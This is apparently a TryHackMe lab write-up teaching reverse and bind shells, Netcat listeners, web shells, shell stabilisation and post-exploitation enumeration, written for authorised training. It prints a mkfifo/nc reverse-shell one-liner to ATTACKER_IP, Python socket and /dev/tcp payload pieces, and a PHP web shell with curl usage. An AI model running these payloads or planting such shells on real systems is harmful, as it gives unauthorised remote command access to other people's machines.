| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Category** | Offensive Security Tooling / Shells |
| **Difficulty** | Easy |
| **Time** | ~90 Minutes |
| **Module** | Offensive Security Tooling |

---

## Objective

A **shell** is an interface that allows a user or process to interact with an operating system and execute commands. In cybersecurity the word has a sharper meaning: after compromising a system, an attacker may obtain a **shell** that lets them run commands on the target. That shell becomes the bridge between exploitation and everything that follows — enumeration, privilege escalation, data access, persistence and lateral movement.

```text
Attacker
   |
   | Exploitation
   v
Vulnerable Service / Application
   |
   | Shell Access
   v
Compromised System
   |
   +--> Enumeration
   +--> Privilege Escalation
   +--> Data Access
   +--> Persistence
   +--> Lateral Movement / Pivoting
```

By the end of this room you will be able to:

- Explain what a **shell** is and how it differs from a terminal and a CLI
- Distinguish **local** vs **remote** and **interactive** vs **non-interactive** shells
- Describe **reverse shells** and **bind shells** and the direction each connection travels
- Set up a **Netcat listener** (`nc -lvnp`) and understand each option
- Read a **pipe-based reverse shell** payload and the I/O redirection behind it
- Build **Bash**, **PHP** and **Python** reverse-shell payloads from their components
- Deploy and interact with a **web shell** over HTTP with `curl`
- Choose between listeners — **Netcat**, **Ncat**, **Socat**, **rlwrap**
- **Stabilise** a raw shell into a usable PTY with `python3 -c` + `stty`
- Escape **restricted shells** and run a **post-shell enumeration** methodology

> **Warning:** Every technique here is for systems you own or have **explicit written authorisation** to test, or inside the provided TryHackMe lab. Obtaining or using a shell on a machine you do not control is illegal.

---

## Task 1 — What Is a Shell?

A **shell** is software that allows a user to interact with an operating system, commonly through a **command-line interface (CLI)**. The shell receives a command, asks the OS to execute it, and returns the result. For example, on Linux:

```bash
$ whoami
student
$ pwd
/home/student
```

The terms *shell*, *CLI* and *terminal* are used interchangeably but are technically different:

| Term | Meaning |
|---|---|
| **Shell** | Program that interprets commands and interacts with the OS |
| **CLI** | Command-line interface used to interact with a system |
| **Terminal** | Application/interface that provides access to a shell |
| **Terminal Emulator** | Graphical application that emulates a physical terminal |
| **Command** | Instruction entered into the shell |

The basic flow is a loop from user to OS and back:

```text
User → command → Shell → system call / process execution → Operating System → result → Shell → output → User
```

> **Memory trick:** **Terminal = where you type. Shell = what interprets what you type.**

Different environments provide different shells. On **Linux / Unix** you meet **Bash, Zsh, Dash, Fish, Sh, Ksh**; check the current one with `echo $SHELL` (which may print `/bin/bash`). **Windows** commonly uses **Command Prompt (`cmd.exe`)** and **PowerShell**, the latter being powerful because it exposes Windows APIs, .NET and system administration through scripting.

A **local shell** runs directly on the machine you are using (`Your Computer → Terminal → Bash → Local OS`). A **remote shell** lets you execute commands on another machine over a network — legitimately via SSH, Remote PowerShell or remote administration tools, and in pentesting after exploiting a vulnerability:

```text
Attacker Machine        Network         Target Machine
  10.10.10.5      ───────────────►       10.10.10.20
                                              |
                                              v
                                        Target Shell
```

---

## Task 2 — Shells in the Attack Chain

In offensive security a shell usually means command-line access obtained on a compromised machine. Its value is that it provides far more control than a single vulnerable web interface: once you have a shell you can enumerate users, processes, files, network configuration, running services and credentials, then attempt privilege escalation and post-exploitation.

Crucially, a shell does **not automatically mean root or administrator access** — it runs with the privileges of whatever account or process obtained it. A typical foothold looks like this:

```text
Attacker → Web Application → Shell → www-data
```

A first enumeration sequence answers "who/where/what am I?":

```bash
$ whoami
$ hostname
$ id
$ pwd
$ uname -a
```

The room frames a whole chain of concepts that a shell unlocks — each is a distinct milestone, not the finish line:

> **1. Privilege Escalation**
> Moving from a lower-privileged account (e.g. `www-data`) toward a higher-privileged one (`root` / Administrator). Shell access alone does not grant it.

> **2. Data Exfiltration**
> Reading and extracting sensitive data the account can access. From a defender's view, unusual outbound transfers are an indicator.

> **3. Persistence**
> Maintaining access after the original entry point is closed — unauthorised accounts, services, scheduled tasks or startup mechanisms. In an authorised test, only with explicit permission.

> **4. Post-Exploitation**
> Everything performed after initial compromise: enumeration, privilege escalation, credential discovery, persistence and lateral movement.

> **5. Pivoting**
> Using a compromised system as a bridge to reach other systems or network segments that are not directly reachable.

Shells also differ in usability. An **interactive shell** supports prompts, job control and interactive programs; a **non-interactive shell** simply executes commands without a full terminal environment. This distinction drives the whole stabilisation discussion in Task 10.

> **Note:** **Pivoting** (reaching new network segments through a host) is often confused with **lateral movement** (moving between systems). Both rely on a foothold shell.

---

## Task 3 — Reverse Shells

A **reverse shell** is a remote shell where the **target initiates a connection back to the attacker's listening system**. It is called "reverse" because the direction is flipped from a normal client→server connection: here the compromised target reaches *out* to the attacker.

```text
TARGET
   |
   | Initiates connection
   v
ATTACKER
   |
   v
Shell
```

Reverse shells are useful precisely because of **firewalls**. Most networks heavily filter *inbound* connections but allow *outbound* traffic, so a target that cannot accept a connection can often still make one. The architecture has three parts:

> **1. Vulnerability**
> The flaw (command injection, insecure upload, RCE, etc.) that lets the attacker run the initial payload on the target.

> **2. Payload**
> The command or script that runs on the target, creates the outbound connection and attaches a shell's input/output to it.

> **3. Listener**
> The process waiting on the attacker's machine to receive the incoming connection and present the shell.

The workflow is always: **start listener → deliver payload → target connects back → interact with shell.** The listener must normally be running *before* the payload fires.

> **Tip:** A quick way to choose: outbound allowed but inbound blocked → **reverse shell**. Compare with the bind shell in Task 6.

---

## Task 4 — Netcat Listeners

**Netcat** (`nc`) is the "network Swiss Army knife" — it can create TCP/UDP connections, listen, send and receive data, and assist with shell listeners. The canonical reverse-shell listener is:

```bash
$ nc -lvnp 443
listening on [any] 443 ...
```

Each option matters:

| Option | Meaning |
|---|---|
| `-l` | **Listen** for an incoming connection (otherwise `nc` acts as a client) |
| `-v` | **Verbose** — view more connection information |
| `-n` | **No DNS** — work directly with IP addresses, no hostname resolution |
| `-p` | **Port** — specify the local listening port |

When a target connects, verbose mode shows the source:

```bash
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
```

A listener is **not** a shell — it is simply waiting. The shell only appears once the target runs the payload and attaches its I/O to the connection:

```text
Listener != Shell
```

Do not confuse the two halves of the technique:

> **Listener**
> Runs on the **attacker's** machine. Its job is to `WAIT FOR CONNECTION`. Example: `nc -lvnp 443`.

> **Payload**
> Runs on the **target**. Its job is to `CREATE CONNECTION`, `ATTACH SHELL`, and `SEND/RECEIVE DATA`.

On **port choice**: a reverse shell can use many TCP ports — `4444`, `443`, `80`, `8080`, `53`. TryHackMe uses `443` because it is commonly associated with HTTPS traffic, but a raw TCP listener on 443 is **not automatically HTTPS** — `Port number != Protocol`. On Linux, ports below `1024` (e.g. `80`, `443`, `22`, `53`) are privileged and may require elevated permissions to bind; ports above `1024` (e.g. `4444`, `8080`, `9001`) are easier for an unprivileged user.

| Port | Common Association |
|---:|---|
| `22` | SSH |
| `53` | DNS |
| `80` | HTTP |
| `443` | HTTPS |
| `445` | SMB |
| `8080` | Alternate HTTP |
| `8443` | Alternate HTTPS |
| `4444` | Frequently used in security labs/tools |

> **Memory trick:** `-l` = Listen, `-v` = Verbose, `-n` = Numeric / no DNS, `-p` = Port.

---

## Task 5 — The Pipe-Based Reverse Shell Payload

Once the listener is ready, the target runs a payload that connects out and redirects its shell I/O across the network. Understanding this requires the three standard file descriptors:

| FD | Name | Meaning |
|---:|---|---|
| `0` | stdin | Standard input |
| `1` | stdout | Standard output |
| `2` | stderr | Standard error |

A reverse shell must route these streams through the socket. A key expression is:

```bash
2>&1
```

which redirects standard error (`2`) to the same destination as standard output (`1`), so errors also reach the attacker.

A **named pipe** (FIFO) is a filesystem object for inter-process communication, created with:

```bash
$ mkfifo /tmp/f
```

`/tmp` is used because it is commonly writable by normal users. The room's full **pipe-based reverse shell** ties these pieces together:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT > /tmp/f
```

Reading it left to right:

> **1. `rm -f /tmp/f`**
> Force-remove any existing `/tmp/f` so the sequence starts from a clean state and does not error if the object already exists.

> **2. `mkfifo /tmp/f`**
> Create the named pipe (FIFO) that will carry data between the network side and the shell.

> **3. `cat /tmp/f`**
> Read from the FIFO — whatever the attacker sends arrives here and becomes shell input.

> **4. `sh -i`**
> Launch an **interactive** shell (`-i`). An interactive shell is *not* the same as a full TTY/PTY, which matters later.

> **5. `nc ATTACKER_IP ATTACKER_PORT`**
> Netcat creates the outbound connection from the target to the attacker's listener, e.g. `ATTACKER_IP → 10.10.10.5`, `ATTACKER_PORT → 443`.

The complete flow connects the FIFO → `cat` → `sh -i` (stdout + stderr) → `nc` → attacker:

```text
                 TARGET
                   |
                   v
             /tmp/f FIFO
                   |
                   v
                  cat
                   |
                   v
                sh -i
                   |
             +-----+-----+
             |           |
           stdout      stderr
             |           |
             +-----+-----+
                   |
                   v
                  nc
                   |
                   | TCP
                   v
              ATTACKER
              Listener
```

On the attacker side you simply wait, and the connection reveals the target's IP and an ephemeral source port (which will vary):

```bash
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
```

Common reasons a reverse shell fails: **wrong IP**, **wrong port**, **listener not running / started too late**, **firewall / egress filtering**, **routing problems**, **incompatible payload**, **missing shell or interpreter**, and **incorrect payload syntax**.

> **Memory trick:** `2 = stderr`, `1 = stdout`, so `2>&1` sends `stderr -> stdout`.

---

## Task 6 — Bind Shells & Reverse vs Bind

A **bind shell** is the opposite of a reverse shell: the **target machine opens a listening port and waits for the attacker to connect to it**.

```text
TARGET
   |
   | Opens listening port
   v
[LISTENER]
   ^
   |
   | Attacker connects
   |
ATTACKER
```

The shell is "bound" to a network socket/port on the target. The attacker then acts as the **client** and connects to it with Netcat:

```bash
$ nc -nv 10.10.10.20 4444
```

Here `-n` disables DNS resolution and `-v` is verbose. The two shell types differ only in *who listens* and *which way the connection travels*:

| Feature | Reverse Shell | Bind Shell |
|---|---|---|
| Listener | Attacker | Target |
| Connection initiated by | Target | Attacker |
| Target listens? | Usually No | Yes |
| Attacker listens? | Yes | Usually No |
| Connection direction | Target → Attacker | Attacker → Target |
| Target needs an open listening port? | No | Yes |
| Common in CTFs | Yes | Yes |

A bind shell's weakness is that the target must expose a reachable listening port — **firewalls, NAT and network segmentation** frequently block inbound access, which is why a reverse shell often works when a bind shell does not. Bind shells are also easier to detect because they create an unexpected listening service. Defenders enumerate listeners with:

```bash
$ ss -lntp
LISTEN
0.0.0.0:22
0.0.0.0:80
0.0.0.0:4444
```

The bind address matters. A service on `0.0.0.0` listens on **all available IPv4 interfaces** (potentially network-accessible), while `127.0.0.1` is the **loopback** interface (local only), which an external attacker normally cannot reach:

| Address | Meaning | Typical Exposure |
|---|---|---|
| `127.0.0.1` | Loopback | Local machine |
| `0.0.0.0` | All IPv4 interfaces | Potentially network accessible |
| Specific IP | One interface | Depends on routing/interface |

> **Memory trick:** **REVERSE = Target calls Attacker. BIND = Target waits for Attacker.**

---

## Task 7 — Shell Listeners & Tools

Netcat is the simplest listener, but several tools sit at different points on the shell-interaction hierarchy. Each solves a different problem, and none of them escalate privileges, bypass firewalls or fix a broken payload on their own.

The basic **Netcat** listener and client:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from [TARGET_IP] ...
$ nc -nv TARGET_IP 4444
```

Wrapping Netcat with **`rlwrap`** adds readline command-line editing and history to the caught shell (the networking is still Netcat):

```bash
$ rlwrap nc -lvnp 4444
```

**Ncat** (from Nmap) is Netcat-compatible and adds features such as TLS. A plain TCP client cannot talk to a TLS listener, so both ends must match:

```bash
$ ncat -lvnp 4444
$ ncat --ssl -lvnp 443
```

**Socat** offers the most control over how data streams are connected — useful later for full PTY handling — at the cost of more complex syntax:

```bash
$ socat TCP-LISTEN:4444,reuseaddr,fork STDOUT
```

The option meanings for these listeners:

| Command / Option | Meaning |
|---|---|
| `nc` | Netcat |
| `ncat` | Nmap's Netcat-compatible utility |
| `-l` | Listen |
| `-v` | Verbose |
| `-n` | Disable DNS resolution |
| `-p` | Specify port |
| `rlwrap` | Readline wrapper |
| `--ssl` | Enable SSL/TLS in Ncat |
| `TCP-LISTEN` | Socat TCP listener |
| `reuseaddr` | Allow socket address reuse where applicable |
| `fork` | Handle connections using child processes |
| `STDOUT` | Standard output |
| `ss` | Socket statistics |

The interaction hierarchy climbs from raw TCP toward proper terminal semantics:

```text
Netcat → Basic TCP
   → + rlwrap → better CLI interaction
   → PTY → better terminal semantics
```

> **Note:** `rlwrap` does **not** create a shell, encrypt traffic, bypass a firewall, turn Netcat into SSH, or automatically create a PTY. Its only job is **better command-line interaction**.

---

## Task 8 — Shell Payloads: Bash, PHP & Python

A **payload** runs on the target to create the connection and attach a shell; it is distinct from the listener that waits on the attacker side. Payload choice depends on what interpreters and binaries the target actually has.

### Bash

Bash can open TCP connections through its special `/dev/tcp` path, which the shell interprets rather than a real device file:

```text
/dev/tcp/10.10.10.5/4444
```

This means "TCP connection to `10.10.10.5` on port `4444`" — but it depends on Bash support and may not work in `sh`, `dash` or other shells. Rather than memorising one-liners, learn the building blocks:

> **Bash payload building blocks**
> Shell: `bash -i` · Pipe: `|` · Redirect stdout: `>` · Redirect stdin: `<` · Redirect stderr: `2>` · Combine stderr with stdout: `2>&1` · Create FIFO: `mkfifo /tmp/f` · Remove FIFO: `rm -f /tmp/f`

> **Note:** `sh -i` / `bash -i` request an **interactive** shell, but an interactive shell is not the same as a fully allocated TTY/PTY — `Interactive Shell ≠ Full PTY`.

### PHP

PHP matters when the target is a web server (`Apache/Nginx → PHP → OS`). If an attacker can execute arbitrary PHP, several functions reach the operating system. `fsockopen()` opens a network socket, and the command-execution functions differ in how they return output. *(PHP has no allowlisted terminal tag, so these snippets use `text`.)*

```text
<?php
exec("whoami", $output);   // populates an array with command output
system("whoami");          // executes and outputs the result directly
$output = shell_exec("whoami");  // returns full output as a string
passthru("whoami");        // passes raw output straight to the output stream
?>
```

The danger is untrusted input reaching one of these functions:

```text
<?php
system($_GET['cmd']);
?>
```

This lets HTTP input become an OS command — `Untrusted Input + OS Command Execution = Potential Command Injection / RCE`.

### Python

Python is a common payload language because of its networking and process libraries. The building blocks are `socket`, `subprocess` and `os`:

```python
import socket
s = socket.socket()
s.connect(("ATTACKER_IP", ATTACKER_PORT))
```

```python
import subprocess
subprocess.call(["whoami"])
```

`os.dup2()` duplicates a file descriptor, which is how a Python reverse shell attaches `stdin`, `stdout` and `stderr` to the socket. Watch for **version compatibility** — `python`, `python2` and `python3` may be different interpreters, so a Python 2 payload can fail on a Python 3 target. Check first:

```bash
$ python --version
$ python3 --version
```

Other interpreters occasionally appear in payloads too: **Telnet** (legacy, unencrypted — prefer SSH), **AWK** (text processing that can invoke external commands in some implementations), and **BusyBox** (a single binary bundling many stripped-down Unix utilities, common on embedded systems).

> **Tip:** Choose the payload to match the target: web server with PHP → PHP payload; Bash present and `/dev/tcp` supported → Bash; Python installed → Python. Always verify the interpreter exists before firing.

---

## Task 9 — Web Shells & Web-Based Command Execution

A **web shell** is a server-side script that provides command execution through HTTP/HTTPS — the web request becomes the command transport. Unlike a reverse or bind shell it uses the request/response model rather than a persistent bidirectional connection.

A minimal PHP web shell reads a parameter and executes it. *(PHP/HTML have no allowlisted terminal tag, so these use `text`.)*

```text
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Wrapping output in `<pre>` preserves whitespace so multi-line output (like `id`) is readable in a browser:

```text
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

Commands travel as request parameters. A **GET** request puts the command in the URL; a **POST** request puts it in the body (POST does **not** make it safe):

```text
GET /shell.php?cmd=hostname     →  $_GET['cmd']  → hostname → target-host
POST /shell.php  (cmd=hostname) →  $_POST['cmd'] → hostname
```

You can drive a web shell from the command line with **`curl`**, which is handy when a browser is inconvenient. Special characters in commands may need URL encoding:

```bash
$ curl "http://TARGET/shell.php?cmd=whoami"
www-data
```

A common way web shells are planted is an insufficiently validated **file upload**: if a server-side script lands in a web-accessible, executable directory (the **web root**, e.g. `/var/www/html/`), it can be reached and executed. Checking only the file extension is not enough — layered checks (extension **+** MIME type **+** magic bytes **+** content **+** server execution policy) are required. A file in `/tmp/shell.php` may not be web-accessible while `/var/www/html/uploads/shell.php` is.

A web shell runs with the **privileges of the web-server process** — often `www-data`, not `root`:

```bash
$ whoami
www-data
$ id
```

Existing web-shell projects encountered in training include **`p0wny-shell`**, **`b374k`** and **`c99`** — PHP-based tools offering command execution, file browsing, upload/download and system enumeration through the browser. Use them only where explicit authorisation exists.

> **Security relevance:** Web shells are convenient but limited — no full terminal, dependent on the web server staying up, awkward with large or interactive output, and they leave files, HTTP logs and process indicators. They are best treated as a stepping stone toward a more interactive shell.

---

## Task 10 — Shell Stabilisation, TTY & PTY

A freshly caught reverse shell is usually a **raw shell**: no job control, no tab completion, no arrow-key history, and `Ctrl+C` kills the whole session instead of the running command. The fix is to upgrade it to a **PTY** (pseudo-terminal), which provides real terminal behaviour. First understand the vocabulary:

| Term | Meaning |
|---|---|
| **Shell** | Program that interprets commands |
| **Terminal** | Interface that provides access to a shell |
| **TTY** | A real/virtual terminal device |
| **PTY** | A pseudo-terminal that emulates terminal behaviour for a program |

The most common upgrade spawns a PTY with Python:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This asks Python's `pty` module to spawn Bash attached to a pseudo-terminal (`Python → pty.spawn() → PTY → /bin/bash`). If Python 3 is missing, check for alternatives with `which python`, `which python2`, `which python3`, or use other PTY-capable tools:

```bash
$ script /dev/null -c bash
```

Socat can produce an even more complete terminal when configured correctly, though its syntax is more complex than Netcat.

The **full stabilisation sequence** used in authorised labs runs in order:

| **1** | **Spawn a PTY**<br>`python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| --- | --- |

| **2** | **Suspend the shell**<br>Press `Ctrl+Z` to background the remote shell so you can configure your local terminal. |
| --- | --- |

| **3** | **Configure the local terminal**<br>`stty raw -echo` — passes input directly (raw) and disables local echo so characters are not shown twice. |
| --- | --- |

| **4** | **Bring the shell back**<br>`fg` returns the suspended job to the foreground. |
| --- | --- |

| **5** | **Reset the terminal**<br>`reset` re-initialises the display after the mode switch. |
| --- | --- |

| **6** | **Set dimensions**<br>`stty rows 40 columns 120` so interactive programs render correctly. |
| --- | --- |

| **7** | **Verify**<br>`tty` should now report a PTY device. |
| --- | --- |

To match dimensions to your real terminal, read them locally with `stty -a` (which shows values such as `rows 40;` and `columns 120;`) then apply them on the remote shell. Also set the terminal type so colours and cursor movement work:

```bash
$ echo $TERM
$ export TERM=xterm
$ export TERM=xterm-256color
```

Correct `TERM` + correct rows/columns + a PTY together give proper terminal behaviour. Test the result with `whoami`, `pwd`, `tty`, `echo $TERM`, `stty -a`, and an interactive program like `top`, `less /etc/passwd`, `vim` or `nano`.

> **Warning:** `stty raw -echo` changes your **local** terminal. If something goes wrong the terminal can look broken — remember `reset` (and `stty sane`) to recover.

> **Note:** Stabilisation is only about **usability**. `Shell Stabilization ≠ Privilege Escalation`, `≠ Persistence`, and `≠ Encryption` — a `www-data` shell stays `www-data`, and a PTY does not secure the traffic.

---

## Task 11 — Restricted Shells & Shell Escapes

A **restricted shell** deliberately limits what a user can do — restricting commands, disabling `cd`, blocking output redirection, or locking down `PATH`. `rbash` (restricted Bash) is a common example. It is a *convenience* control, not a hard security boundary.

Begin by understanding the environment: identify the user and shell, then inspect the search path:

```bash
$ id
$ echo $PATH
```

A restricted `PATH` limits which binaries resolve, but restrictions frequently fail because **allowed programs contain their own functionality that can execute other programs or a shell**. The systematic question is: *what can I execute → what features do those commands provide → can any feature launch another program → can that program launch a shell?*

Programs that commonly become escape paths:

> **1. Editors — `vim` / `vi`, `less`, `man`**
> Editors and pagers can run external commands. `less /etc/passwd` (or `man`, which pages through `less`) may expose command execution, so an unrestricted `vim` can defeat the restriction entirely.

> **2. Interpreters — `python`, `python3`, `perl`, `ruby`, `php`, `awk`**
> An interpreter is far more powerful than a restricted shell. For example Python exposes `import os` and `import subprocess`, giving file, process and network operations that bypass the shell's limits.

> **3. File utilities — `find`, `xargs`**
> `find` can execute commands as part of its file-processing features (`find /tmp -type f`), and `xargs` builds and runs commands from input — both can be leveraged for escape.

For a structured approach, **GTFOBins** catalogues how legitimate Unix binaries can be abused (shell escape, file read/write, privilege escalation via SUID/sudo). The version and configuration of a binary matter — a finding is not automatic exploitation.

> **Security principle:** *Least functionality* — the fewer binaries and features exposed, the smaller the escape surface. **The binary is the boundary**, not the shell prompt.

---

## Task 12 — Post-Shell Enumeration Methodology

A shell is a **foothold**, not the objective. After getting (and stabilising) one, work through a repeatable methodology: **Identity → Host → Shell → Environment → Files → Processes → Network → Privileges → Security context**.

**Identity and host** — who and where you are:

```bash
$ id
$ uname -a
```

`id` shows UID, GID and group memberships (some groups such as `sudo`, `docker`, `disk`, `adm`, `lxd` can be significant); `uname -a` reveals kernel, OS and architecture.

**Environment and files** — inspect `PATH`, then hunt through home directories, `.ssh`, config files, web-application files and writable locations for secrets and credentials. **Processes and network** — enumerate running processes and their owners, network interfaces, routing, and listening/established sockets to understand internal reachability:

```bash
$ ss -lntp
$ ip addr
```

**Privileges** — the core of privilege escalation. Check what you can run as `sudo`, then look for SUID binaries and Linux capabilities:

```bash
$ sudo -l
$ find / -perm -4000 -type f 2>/dev/null
$ getcap -r / 2>/dev/null
```

`sudo -l` lists commands the user may run through `sudo`; the `find` command locates SUID files (which may run with the file owner's effective UID); `getcap` finds binaries granted specific capabilities. SUID and capabilities are related but distinct:

| Feature | SUID | Capabilities |
|---|---|---|
| Privilege model | Effective UID | Specific privileges |
| Granularity | Broad | More granular |
| Common owner | root | Various |
| Security risk | Depends on binary | Depends on capability |
| Enumeration | `find` | `getcap` |

**Security context** — finally check for SELinux/AppArmor and whether you are inside a container (`Containers ≠ host automatically`), because that changes the attack path.

> **The golden rule:** a **finding is not the same as exploitability**. Enumerate to understand the target before making assumptions, then validate impact rather than assuming every SUID binary or sudo entry is a win.

---

## Quick Revision

| Topic | Key fact |
|---|---|
| **Shell** | Software that interprets commands and talks to the OS; runs with the account's privileges |
| **Shell vs Terminal** | Terminal = where you type; shell = what interprets it |
| **Reverse shell** | Target connects back to the attacker's listener (beats inbound firewalls) |
| **Bind shell** | Target opens a listening port; attacker connects in |
| **Netcat listener** | `nc -lvnp 443` — listen, verbose, no-DNS, port |
| **Netcat client** | `nc -nv TARGET_IP 4444` |
| **Pipe payload** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| sh -i 2>&1 \| nc ATTACKER_IP ATTACKER_PORT > /tmp/f` |
| **File descriptors** | `0` stdin, `1` stdout, `2` stderr; `2>&1` merges stderr into stdout |
| **Bind address** | `0.0.0.0` = all IPv4 interfaces; `127.0.0.1` = loopback only |
| **Listeners** | `nc`, `rlwrap nc`, `ncat --ssl`, `socat TCP-LISTEN` |
| **Bash TCP** | `/dev/tcp/IP/PORT` (Bash-only; not in `sh`/`dash`) |
| **PHP exec** | `system()`, `exec()`, `shell_exec()`, `passthru()` |
| **Web shell** | `<?php system($_GET['cmd']); ?>` driven via `curl` |
| **Stabilise** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo` → `fg` → `reset` |
| **PTY ≠** | privilege escalation, persistence or encryption |
| **Restricted shell** | `rbash`; escape via editors, interpreters, `find`/`xargs`, GTFOBins |
| **Enumeration** | `id`, `uname -a`, `sudo -l`, `find / -perm -4000 -type f 2>/dev/null`, `getcap -r / 2>/dev/null` |

**Key idea:** a shell is the *foothold*. The real work — stabilise, enumerate, understand privileges, assess impact — starts after you get it.

---

## Cheat Sheet

### Listeners (attacker side)

| Purpose | Command |
|---|---|
| **Netcat listener** | `nc -lvnp 4444` |
| **Netcat listener (443)** | `nc -lvnp 443` |
| **Readline-enhanced** | `rlwrap nc -lvnp 4444` |
| **Ncat listener** | `ncat -lvnp 4444` |
| **Ncat TLS listener** | `ncat --ssl -lvnp 443` |
| **Socat TCP listener** | `socat TCP-LISTEN:4444,reuseaddr,fork STDOUT` |

### Connect to a bind shell (attacker side)

```bash
$ nc -nv 10.10.10.20 4444
```

### Reverse shell payloads (target side)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT > /tmp/f
```

Bash TCP path (Bash only): `/dev/tcp/10.10.10.5/4444`

Python building blocks:

```python
import socket
s = socket.socket()
s.connect(("ATTACKER_IP", ATTACKER_PORT))
```

PHP web shell (no allowlisted terminal tag → shown as `text`):

```text
<?php system($_GET['cmd']); ?>
```

Drive it: `curl "http://TARGET/shell.php?cmd=whoami"`

### Shell stabilisation

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ script /dev/null -c bash
$ stty raw -echo
$ fg
$ reset
$ stty rows 40 columns 120
$ stty -a
$ export TERM=xterm-256color
$ tty
```

### Enumeration & detection

| Purpose | Command |
|---|---|
| **Current user** | `whoami` |
| **UID/GID/groups** | `id` |
| **Host / kernel** | `uname -a` |
| **Network interfaces** | `ip addr` |
| **Listening sockets** | `ss -lntp` |
| **Sudo rights** | `sudo -l` |
| **SUID files** | `find / -perm -4000 -type f 2>/dev/null` |
| **Capabilities** | `getcap -r / 2>/dev/null` |

---

## Interview Questions

| Question | Answer |
|---|---|
| **Q1. What is a shell?** | A shell is software that provides an interface for interacting with an operating system, commonly through a command-line interface. |
| **Q2. What is a remote shell?** | A remote shell provides command-line interaction with another machine over a network. |
| **Q3. Does obtaining a shell mean you have root privileges?** | No. A shell runs with the privileges of the account or process that obtained it. |
| **Q4. What is privilege escalation?** | Privilege escalation is the process of obtaining higher privileges than those initially available. |
| **Q5. What is pivoting?** | Pivoting is using a compromised system as a bridge to access other systems or network segments. |
| **Q6. What is a reverse shell?** | A reverse shell is a remote shell where the target initiates a connection back to the attacker's listening system. |
| **Q7. What is a listener?** | A listener is a process waiting for an incoming network connection. |
| **Q8. What is the difference between a listener and a payload?** | The listener waits for a connection, while the payload executes on the target and establishes the connection. |
| **Q9. What does `nc -lvnp 443` do?** | It starts Netcat in listening mode with verbose output, disables DNS resolution, and listens on TCP port 443. |
| **Q10. What does `2>&1` mean?** | It redirects standard error (`2`) to standard output (`1`). |
| **Q11. What are file descriptors 0, 1, and 2?** | `0 = stdin`, `1 = stdout`, `2 = stderr`. |
| **Q12. What is a FIFO?** | A FIFO is a named pipe that provides inter-process communication using first-in, first-out semantics. |
| **Q13. Does using port 443 make a reverse shell HTTPS?** | No. A port number does not determine the application protocol. |
| **Q14. What is a bind shell?** | A bind shell is a shell where the target listens on a network port and waits for the attacker to connect. |
| **Q15. Why might a reverse shell work when a bind shell does not?** | If inbound connections to the target are blocked but outbound connections are allowed, a reverse shell may be able to establish the connection while a bind shell cannot. |
| **Q16. Why can bind shells be easier to detect?** | They create an unexpected listening service on the target, which can potentially be discovered through local or remote port enumeration. |
| **Q17. What does `0.0.0.0` commonly mean when used for listening?** | It generally means listening on all available IPv4 interfaces. |
| **Q18. What are common reasons a reverse shell fails?** | Wrong IP<br>Wrong port<br>Listener not running<br>Firewall restrictions<br>Routing problems<br>Incompatible payload<br>Missing shell/interpreter<br>Incorrect payload syntax. |

## Final Takeaway

A **shell** is the command interpreter that turns a foothold into control of a machine, but it is only the beginning: it runs with the privileges of whatever obtained it, so **shell access is a milestone, not root**. You reach a target with a **reverse shell** (the target connects back, defeating inbound firewalls) or a **bind shell** (the target listens and you connect in), receive it on a **Netcat listener** (`nc -lvnp`), and deliver it with a **payload** in **Bash** (`/dev/tcp`, the `mkfifo` pipe one-liner), **PHP** (`system()`, `exec()`, `shell_exec()`, `passthru()`), or **Python** (`socket` + `subprocess` + `os.dup2()`). A **web shell** makes HTTP the command transport, usually running as **`www-data`**. A raw shell becomes usable through **stabilisation** — `python3 -c 'import pty; pty.spawn("/bin/bash")'` plus **`stty raw -echo`** and the right **`TERM`** — remembering that a **PTY** is not privilege escalation, persistence or encryption. **Restricted shells** fall to the functionality of allowed **interpreters**, **editors** and utilities (see **GTFOBins**). Above all, follow the **post-shell enumeration** methodology — **Identity → Environment → Files → Processes → Network → Privileges → Security context** — and remember the golden rule: **a finding is not the same as exploitability**. Get the shell, don't stop, **stabilise, enumerate, analyse, and validate impact**.
